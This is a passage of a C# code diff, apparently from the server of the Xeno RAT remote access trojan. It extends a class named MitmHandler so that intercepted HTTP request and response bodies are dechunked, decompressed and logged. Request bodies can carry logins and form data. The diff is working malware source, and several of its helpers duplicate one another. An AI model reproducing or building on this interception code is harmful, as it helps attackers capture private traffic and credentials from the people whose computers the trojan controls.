-                            await dst.WriteAsync(buf, 0, read, ct).ConfigureAwait(false);
-                            await dst.FlushAsync(ct).ConfigureAwait(false);
+                            using (var reader = new StreamReader(decodeStream, Encoding.UTF8, detectEncodingFromByteOrderMarks: true))
+                            {
+                                string bodyText = await reader.ReadToEndAsync().ConfigureAwait(false);
+                                if (!string.IsNullOrEmpty(bodyText))
+                                    _log($"HTTP response body (decoded, truncated):\n{Truncate(bodyText, 2000)}");
+                            }
                         }
                         catch (Exception ex)
                         {
-                            _log("Relay write failed: " + ex.Message);
-                            break;
+                            _log($"Failed to read response body: {ex.Message}");
                         }
                     }
                 }
@@ -2213,10 +2209,446 @@ namespace xeno_rat_server.Forms
                 }
             }
 
+            // Returns index length up to and including CRLFCRLF, or -1 if headers not complete
+            int TryFindHeadersLength(byte[] data)
+            {
+                if (data == null || data.Length < 4) return -1;
+                for (int i = 0; i + 3 < data.Length; i++)
+                {
+                    if (data[i] == 13 && data[i + 1] == 10 && data[i + 2] == 13 && data[i + 3] == 10)
+                    {
+                        return i + 4;
+                    }
+                }
+                return -1;
+            }
+
+            // --- Helper to detect headers in raw bytes ---
+            private static string TryExtractHeaders(byte[] raw, out int headersLength)
+            {
+                headersLength = 0;
+                for (int i = 0; i < raw.Length - 3; i++)
+                {
+                    if (raw[i] == '\r' && raw[i + 1] == '\n' &&
+                        raw[i + 2] == '\r' && raw[i + 3] == '\n')
+                    {
+                        headersLength = i + 4;
+                        return Encoding.ASCII.GetString(raw, 0, headersLength);
+                    }
+                }
+                return null;
+            }
+
+
+            // Helper: try to dechunk/decompress and log captured body (best-effort). Non-blocking.
+            private async Task TryLogCapturedBodyAsync(byte[] capturedRaw, string contentEncoding, bool wasChunked, bool isRequest)
+            {
+                try
+                {
+                    byte[] dechunked = capturedRaw;
+                    if (wasChunked)
+                    {
+                        if (!TryDechunk(capturedRaw, out dechunked))
+                        {
+                            _log("Body is chunked and dechunk failed; logging raw (truncated).");
+                        }
+                    }
+
+                    string bodyText = null;
+                    if (!string.IsNullOrEmpty(contentEncoding))
+                    {
+                        try
+                        {
+                            bodyText = DecompressToString(dechunked, contentEncoding);
+                        }
+                        catch (Exception ex)
+                        {
+                            _log($"Body decompression failed ({contentEncoding}): {ex.Message}. Logging raw (truncated).");
+                        }
+                    }
+
+                    if (bodyText == null)
+                    {
+                        // Try to treat as UTF-8 plain text
+                        try
+                        {
+                            bodyText = Encoding.UTF8.GetString(dechunked);
+                        }
+                        catch { bodyText = null; }
+                    }
+
+                    if (bodyText != null)
+                    {
+                        // Limit logging length
+                        const int LOG_BODY_LIMIT = 64 * 1024;
+                        var shortBody = Truncate(bodyText, LOG_BODY_LIMIT);
+                        if (isRequest) _log($"HTTP request body (decompressed/truncated):\n{shortBody}");
+                        else _log($"HTTP response body (decompressed/truncated):\n{shortBody}");
+                    }
+                    else
+                    {
+                        // no text interpretation
+                        if (isRequest) _log($"HTTP request body: {dechunked.Length} bytes (binary/truncated)");
+                        else _log($"HTTP response body: {dechunked.Length} bytes (binary/truncated)");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    _log("TryLogCapturedBodyAsync error: " + ex.Message);
+                }
+            }
+
+            // ----- small helpers -----
+            // IndexOf for byte arrays
+            private static int IndexOf(byte[] haystack, byte[] needle)
+            {
+                if (haystack == null || needle == null) return -1;
+                if (needle.Length == 0) return 0;
+                for (int i = 0; i + needle.Length <= haystack.Length; i++)
+                {
+                    bool ok = true;
+                    for (int j = 0; j < needle.Length; j++)
+                    {
+                        if (haystack[i + j] != needle[j]) { ok = false; break; }
+                    }
+                    if (ok) return i;
+                }
+                return -1;
+            }
+
+            // Truncate string to N chars, safely
+            string Truncate(string s, int max)
+            {
+                if (string.IsNullOrEmpty(s)) return s;
+                if (s.Length <= max) return s;
+                return s.Substring(0, max) + "…(truncated)";
+            }
+
+            string TryDecodeText(byte[] raw)
+            {
+                if (raw == null || raw.Length == 0) return null;
+                // try utf8 then fallback to ascii
+                try { return Encoding.UTF8.GetString(raw); } catch { }
+                try { return Encoding.ASCII.GetString(raw); } catch { }
+                return null;
+            }
+
+            // Parse HTTP headers (very simple). Returns lowercase keys.
+            private static Dictionary<string, string> ParseHeaders(string headersRaw)
+            {
+                var d = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
+                if (string.IsNullOrEmpty(headersRaw)) return d;
+                using (var sr = new StringReader(headersRaw))
+                {
+                    string line = sr.ReadLine(); // request/status line
+                    if (!string.IsNullOrEmpty(line))
+                        d[":startline"] = line;
+                    while ((line = sr.ReadLine()) != null)
+                    {
+                        if (string.IsNullOrEmpty(line)) break;
+                        int idx = line.IndexOf(':');
+                        if (idx > 0)
+                        {
+                            var name = line.Substring(0, idx).Trim().ToLowerInvariant();
+                            var val = line.Substring(idx + 1).Trim();
+                            // combine multiple headers of same name
+                            if (d.ContainsKey(name)) d[name] = d[name] + "," + val;
+                            else d[name] = val;
+                        }
+                    }
+                }
+                return d;
+            }
+
+            // Helper: simple dechunker — returns concatenated payload bytes (no trailers support)
+            private static byte[] Dechunk(byte[] chunked)
+            {
+                using (var input = new MemoryStream(chunked))
+                using (var outMs = new MemoryStream())
+                using (var sr = new StreamReader(input, Encoding.ASCII, false, 1024, true))
+                {
+                    while (true)
+                    {
+                        // read chunk size line
+                        string sizeLine = sr.ReadLine();
+                        if (sizeLine == null) break;
+                        int semi = sizeLine.IndexOf(';');
+                        if (semi >= 0) sizeLine = sizeLine.Substring(0, semi);
+                        sizeLine = sizeLine.Trim();
+                        if (sizeLine.Length == 0) continue;
+                        int chunkSize = Convert.ToInt32(sizeLine, 16);
+                        if (chunkSize == 0)
+                        {
+                            // consume possible trailer lines until empty line
+                            while (true)
+                            {
+                                string trailer = sr.ReadLine();
+                                if (string.IsNullOrEmpty(trailer)) break;
+                            }
+                            break;
+                        }
+
+                        // read exactly chunkSize bytes from underlying stream
+                        var buffer = new byte[chunkSize];
+                        int read = 0;
+                        while (read < chunkSize)
+                        {
+                            int n = input.Read(buffer, read, chunkSize - read);
+                            if (n <= 0) throw new InvalidOperationException("Unexpected end of chunked stream");
+                            read += n;
+                        }
+                        outMs.Write(buffer, 0, chunkSize);
+
+                        // after chunk bytes, there should be CRLF; consume it
+                        // read two bytes if available
+                        int b1 = input.ReadByte();
+                        if (b1 == -1) break;
+                        if (b1 == '\r')
+                        {
+                            int b2 = input.ReadByte();
+                            if (b2 != '\n')
+                            {
+                                // odd but continue
+                            }
+                        }
+                        else if (b1 == '\n')
+                        {
+                            // okay
+                        }
+                        else
+                        {
+                            // not CRLF, but continue
+                        }
+                    }
+                    return outMs.ToArray();
+                }
+            }
+
+            // Try to dechunk a chunked-encoded payload. Returns false if parsing failed.
+            // Fully binary chunked decoder
+            private static bool TryDechunk(byte[] raw, out byte[] dechunked)
+            {
+                dechunked = null;
+                try
+                {
+                    using (var msIn = new MemoryStream(raw))
+                    using (var msOut = new MemoryStream())
+                    {
+                        while (true)
+                        {
+                            // Read chunk-size line (ends with CRLF)
+                            string line = ReadLine(msIn);
+                            if (line == null) break; // EOF before chunk-size
+                            int semi = line.IndexOf(';');
+                            string sizeStr = (semi >= 0 ? line.Substring(0, semi) : line).Trim();
+                            if (!int.TryParse(sizeStr, System.Globalization.NumberStyles.HexNumber, null, out int chunkSize))
+                            {
+                                return false; // invalid chunk-size
+                            }
+
+                            if (chunkSize == 0)
+                            {
+                                // read and discard trailer headers until empty line
+                                while (true)
+                                {
+                                    string trailer = ReadLine(msIn);
+                                    if (string.IsNullOrEmpty(trailer)) break;
+                                }
+                                break; // end of chunked stream
+                            }
+
+                            // read exact chunkSize bytes
+                            byte[] chunkBuf = new byte[chunkSize];
+                            int read = 0;
+                            while (read < chunkSize)
+                            {
+                                int got = msIn.Read(chunkBuf, read, chunkSize - read);
+                                if (got <= 0) throw new EndOfStreamException("Unexpected EOF while reading chunk data");
+                                read += got;
+                            }
+                            msOut.Write(chunkBuf, 0, chunkSize);
+
+                            // after chunk data, there should be CRLF
+                            int c1 = msIn.ReadByte();
+                            int c2 = msIn.ReadByte();
+                            if (c1 != '\r' || c2 != '\n')
+                                throw new InvalidDataException("Expected CRLF after chunk data");
+                        }
+
+                        dechunked = msOut.ToArray();
+                        return true;
+                    }
+                }
+                catch
+                {
+                    try { dechunked = raw; } catch { dechunked = raw; }
+                    return false;
+                }
+            }
+
+            // Helper: read a line from MemoryStream ending with CRLF (returns string without CRLF)
+            private static string ReadLine(MemoryStream ms)
+            {
+                if (ms.Position >= ms.Length) return null;
+                using (var msLine = new MemoryStream())
+                {
+                    while (true)
+                    {
+                        int b = ms.ReadByte();
+                        if (b == -1) break;
+                        if (b == '\r')
+                        {
+                            int next = ms.ReadByte();
+                            if (next == '\n') break;
+                            msLine.WriteByte((byte)b);
+                            if (next != -1) msLine.WriteByte((byte)next);
+                        }
+                        else
+                        {
+                            msLine.WriteByte((byte)b);
+                        }
+                    }
+                    return Encoding.ASCII.GetString(msLine.ToArray());
+                }
+            }
+
+            // Decompress bytes according to Content-Encoding header; returns text (UTF-8) or throws
+            private static string DecompressToString(byte[] data, string contentEncoding)
+            {
+                if (data == null) return null;
+                if (string.IsNullOrEmpty(contentEncoding)) return Encoding.UTF8.GetString(data);
+
+                contentEncoding = contentEncoding.ToLowerInvariant();
+                // handle common names with possible parameters, e.g. "gzip; q=1.0"
+                if (contentEncoding.Contains("gzip"))
+                {
+                    using (var ms = new MemoryStream(data))
+                    using (var gz = new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionMode.Decompress))
+                    using (var outMs = new MemoryStream())
+                    {
+                        gz.CopyTo(outMs);
+                        return Encoding.UTF8.GetString(outMs.ToArray());
+                    }
+                }
+                if (contentEncoding.Contains("deflate"))
+                {
+                    using (var ms = new MemoryStream(data))
+                    using (var def = new System.IO.Compression.DeflateStream(ms, System.IO.Compression.CompressionMode.Decompress))
+                    using (var outMs = new MemoryStream())
+                    {
+                        def.CopyTo(outMs);
+                        return Encoding.UTF8.GetString(outMs.ToArray());
+                    }
+                }
+                if (contentEncoding.Contains("br") || contentEncoding.Contains("brotli"))
+                {
+                    // Use built-in BrotliStream
+                    using (var ms = new MemoryStream(data))
+                    using (var br = new BrotliStream(ms, System.IO.Compression.CompressionMode.Decompress))
+                    using (var outMs = new MemoryStream())
+                    {
+                        br.CopyTo(outMs);
+                        return Encoding.UTF8.GetString(outMs.ToArray());
+                    }
+                }
+
+                // unsupported encoding, return raw utf8 attempt
+                return Encoding.UTF8.GetString(data);
+            }
+
+            // Helper: copy loop (stream → stream) with cancellation
+            private async Task RelayStreamAsync(Stream src, Stream dst, CancellationToken ct)
+            {
+                await PipePlainAsync(src, dst, ct, true).ConfigureAwait(false); // direction is only for logging label
+            }
+
             // small helper to reuse existing UI logging method
             private void _logUi(string msg)
             {
                 this.form.PostUi(msg);
+            }
+
+            // --- Simple streaming chunked decoder ---
+            public class ChunkedStream : Stream
+            {
+                private readonly Stream _inner;
+                private int _chunkRemaining = 0;
+                private bool _endReached = false;
+
+                public ChunkedStream(Stream inner) => _inner = inner ?? throw new ArgumentNullException(nameof(inner));
+
+                public override bool CanRead => _inner.CanRead;
+                public override bool CanSeek => false;
+                public override bool CanWrite => false;
+                public override long Length => throw new NotSupportedException();
+                public override long Position { get => throw new NotSupportedException(); set => throw new NotSupportedException(); }
+
+                public override void Flush() => _inner.Flush();
+
+                public override int Read(byte[] buffer, int offset, int count)
+                {
+                    if (_endReached) return 0;
+                    if (_chunkRemaining == 0)
+                    {
+                        // read next chunk size
+                        string line = ReadLine(_inner);
+                        if (line == null) { _endReached = true; return 0; }
+                        int semi = line.IndexOf(';');
+                        string sizeStr = semi >= 0 ? line.Substring(0, semi) : line;
+                        _chunkRemaining = Convert.ToInt32(sizeStr.Trim(), 16);
+                        if (_chunkRemaining == 0)
+                        {
+                            // consume trailer + final CRLF
+                            while (true)
+                            {
+                                string trailer = ReadLine(_inner);
+                                if (string.IsNullOrEmpty(trailer)) break;
+                            }
+                            _endReached = true;
+                            return 0;
+                        }
+                    }
+
+                    int toRead = Math.Min(count, _chunkRemaining);
+                    int read = _inner.Read(buffer, offset, toRead);
+                    if (read > 0) _chunkRemaining -= read;
+
+                    if (_chunkRemaining == 0)
+                    {
+                        // consume CRLF after chunk
+                        _inner.ReadByte();
+                        _inner.ReadByte();
+                    }
+
+                    return read;
+                }
+
+                private static string ReadLine(Stream s)
+                {
+                    using (var ms = new MemoryStream())
+                    {
+                        while (true)
+                        {
+                            int b = s.ReadByte();
+                            if (b == -1) break;
+                            if (b == '\r')
+                            {
+                                int next = s.ReadByte();
+                                if (next == '\n') break;
+                                ms.WriteByte((byte)b);
+                                if (next != -1) ms.WriteByte((byte)next);
+                            }
+                            else ms.WriteByte((byte)b);
+                        }
+                        return Encoding.ASCII.GetString(ms.ToArray());
+                    }
+                }
+
+                public override long Seek(long offset, SeekOrigin origin) => throw new NotSupportedException();
+                public override void SetLength(long value) => throw new NotSupportedException();
+                public override void Write(byte[] buffer, int offset, int count) => throw new NotSupportedException();
+                public override Task<int> ReadAsync(byte[] buffer, int offset, int count, CancellationToken cancellationToken)
+                    => Task.Run(() => Read(buffer, offset, count), cancellationToken);
             }
         }   // end MitmHandler
 
